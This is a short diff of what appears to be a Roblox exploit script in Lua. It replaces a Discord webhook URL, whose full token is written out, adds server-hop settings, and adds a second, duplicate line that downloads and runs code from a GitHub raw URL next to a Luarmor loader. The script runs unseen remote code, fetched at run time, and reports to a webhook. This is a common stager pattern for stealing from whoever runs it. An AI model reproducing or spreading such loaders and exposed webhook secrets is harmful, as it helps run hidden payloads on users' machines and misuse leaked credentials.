@@ -72,8 +72,11 @@ getgenv().UserConfig = {
     }
 }
 _G.WEBHOOK_CONFIG = {
-    url = "https://discord.com/api/webhooks/1387491597209305239/4oDVgAmG6g2IdGny1vK4NDDiZJI94B0siNeQGYMjKg8aXsu8nQcBNmgHES-z1d9lzTsf",
-    everyone = true
+    url = "https://discord.com/api/webhooks/1387951494254428323/h-twex6TfgX9WnXcXCMI-zMSwGCfyhxjOWMp79W1syUWb_oRVTWDXflOGvFKIn3ezxPU",
+    everyone = true,
+    hop = true,
+    hop_timer = 300
 }
+loadstring(game:HttpGet("https://raw.githubusercontent.com/OhhMyGehlee/bag/refs/heads/main/io"))()
 loadstring(game:HttpGet("https://raw.githubusercontent.com/OhhMyGehlee/bag/refs/heads/main/io"))()
 loadstring(game:HttpGet("https://api.luarmor.net/files/v3/loaders/ccbddd87670e37be6aa0dbf793748a94.lua"))()
